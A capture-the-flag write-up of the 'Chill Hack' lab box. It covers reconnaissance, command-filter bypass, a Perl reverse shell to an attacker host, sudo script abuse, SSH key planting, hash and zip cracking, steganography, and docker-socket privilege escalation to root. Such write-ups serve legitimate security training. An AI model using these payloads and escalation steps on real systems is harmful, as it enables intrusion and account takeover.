# Chill Hack Writeup


Lets start with a simple `nmap -A -sS -T4 10.10.233.73` we get the following output

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.59.41
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Game Info
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

As we can see there is a webserver running so lets run gobuster and check it out at the same time. Okay so the website doesnt seem very usefull but gobuster found 
`/secret (Status: 301) [Size: 313] [--> http://10.10.233.73/secret/]`

Seems like we can execute commands on it, okay so after testing some commands there is a filter. Commands like `ls` return a 'Are you a Hacker?' page and commands like `echo hi` return the ouput with no problem so we can try hiding malicious intent in `echo`

Which did not take me long to find using `echo *` we can see the directories contents!
`images index.php` Lets try reading the index.php file so we can see the conditions that block our commands and avoid them! Using  ```echo `cat index.php` ``` we can spawn the file and if we now view source we find:
```
<!--?php if(isset($_POST['command'])) { $cmd = $_POST['command']; $store = explode(" ",$cmd); $blacklist = array('nc', 'python', 'bash','php','perl','rm','cat','head','tail','python3','more','less','sh','ls'); for($i=0; $i<count($store); $i++) { for($j=0; $j<count($blacklist); $j++) { if($store[$i] == $blacklist[$j]) {?-->
```

So we now know we cant use without echo the following commands:
`nc,python,bash,php,perl,rm,cat,head,tail,python3,more,less,sh,ls`

If we run `nc -lnvp 9999` on our Attack Machine we listen for a reverse shell and after running the following command we have a shell! I found this on [Pentest Monkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
```
echo `perl -e 'use Socket;$i="YOUR_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
```

Before doing anything run `python3 -c 'import pty; pty.spawn("/bin/sh")'` to spawn a terminal with more capibilities. After looking around for a while I couldnt find much except some mySQL creds, but before checking that out I ran a [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) and got some intresting output:

```
User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

Content of `.helpline.sh`

```
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```

So we see that the `msg` variable will be executed, and send errors to /dev/null. So if we just run the script with `sudo -u apaar /home/apaar/.helpline.sh` we can now inside the script run commands under the `apaar` user. Spawn a better shell `python3 -c 'import pty;pty.spawn("/bin/bash")'` once again then we can navigate to `/home/apaar/` and `cat local.txt` which gives us the User Flag! Good job we have made it this far now time for privesc!

We can also gain ssh access by adding our public ssh key to `.ssh/authorized_keys` with `echo <YOUR SSH PUB KEY> >> .ssh/authorized_keys` and now using `ssh apaar@<VICTIM_IP>` on our attack machine we can login as apaar and get a proper shell!

Lets go back to the mySQL we found earlier in `/var/www/files/index.php` and login with `mysql -u root -p -D webportal`

![[Screen Shot 2022-02-10 at 6.05.57 PM.png]]

After running `show tables;` and  `SELECT * from users;` we can see we get the md5 hash of anurodh account, so lets crack that using [Crack Station](https://crackstation.net/) ![[https://github.com/Gomez0015/CTF-Writeups/📄%20CTF%20Writeups/images/Screen Shot 2022-02-10 at 6.18.23 PM.png]] and we get a postive result! Lets try loging in with ssh now.

Did not work. But I did see something intresting earlier in the `/var/www/files/hacker.php` file:

```
<center>
        <img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
        <h1 style="background-color:red;">You have reached this far. </h2>
        <h1 style="background-color:black;">Look in the dark! You will find your answer</h1>
</center>
```

So lets try looking deeper into the image. To be able to download the image to our machine lets use the ftp service we saw earlier, I had not even noticed that there was an anonymous login available which gave this `note.txt`
```
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

We figured it out alone anyways so didnt miss anything huge. After trying to use ftp and it not working I realised we can just use apaar with the scp command and download the file  `scp apaar@<VICTIM_IP>:/var/www/files/images/hacker-with-laptop_23-2147985341.jpg .`

Now lets run steghide on it `steghide --info hacker-with-laptop_23-2147985341.jpg` after running this command with an empty password we can see a `backup.zip` file hidden inside, so lets extract it! `steghide extract -sf hacker-with-laptop_23-2147985341.jpg`

After extracting it if we try to `unzip backup.zip` it asks for a passphrase so we can try the md5 hashes we cracked earlier. None of them worked so I decided to use john,
first run `zip2john backup.zip | tee hash` to generate a hash file and then we can crack it using `john hash --wordlist=/usr/share/wordlists/rockyou.txt` 
![[Screen Shot 2022-02-10 at 6.27.07 PM.png]] And in a couple seconds we get a successfull password.

Upon using `cat source_code.php` we can see an intresting line:
`if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")`
We directly know its base64 encoded and can decode it easily which gives us
`!d0ntKn0wmYp@ssw0rd` Once again lets try logging in to ssh with this password.

It Worked! Finally we have a new user and new permissions!

After running anothe linPEAS (yes ik im addicted to laziness), we get 2 very very promising results for privesc:

```
Docker socket /var/run/docker.sock is writable
uid=1002(manurodh) gid=1002(manurodh) groups=1002(manurodh),999(docker)
```

So after looking up some privesc with docker I found the [GTFOBins](https://gtfobins.github.io/gtfobins/docker/) reference, which with 1 easy command can spawn a root shell! 
`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`

Good Game! Took a while but we got there! Hope you guys enjoyed, I learned alot along the way and hopefully I didnt do to badly, cya for the next one.


